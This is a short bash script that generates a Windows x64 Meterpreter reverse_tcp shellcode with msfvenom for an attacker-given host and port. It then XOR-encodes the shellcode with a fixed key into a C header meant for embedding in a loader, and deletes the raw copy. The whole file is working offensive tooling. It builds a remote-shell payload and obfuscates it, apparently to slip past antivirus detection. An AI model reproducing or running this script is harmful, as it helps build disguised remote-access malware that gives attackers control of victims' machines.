#!/bin/bash
set -e

LHOST="${1:?Usage: $0 <LHOST> <LPORT>}"
LPORT="${2:?Usage: $0 <LHOST> <LPORT>}"
KEY=0x5A

echo "[+] msfvenom (LHOST=$LHOST LPORT=$LPORT)"
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST="$LHOST" LPORT="$LPORT" \
         -f c -o shellcode_raw.h

echo "[+] XOR (key=$KEY)"
python3 - "$KEY" <<'PY'
import re, sys
key = int(sys.argv[1], 16)
src = open("shellcode_raw.h").read()
data = re.findall(r"0x([0-9a-fA-F]{2})", src)
enc  = ["0x%02x" % (int(b, 16) ^ key) for b in data]
with open("shellcode_enc.h", "w") as f:
    f.write("/* auto-generated - DO NOT COMMIT */\n")
    f.write("unsigned char payload[] = {\n")
    for i in range(0, len(enc), 12):
        f.write("    " + ", ".join(enc[i:i+12]) + ",\n")
    f.write("};\n")
    f.write("unsigned int payload_len = %d;\n" % len(enc))
print("[+] shellcode_enc.h : %d octets" % len(enc))
PY

rm -f shellcode_raw.h
echo "[+] OK"
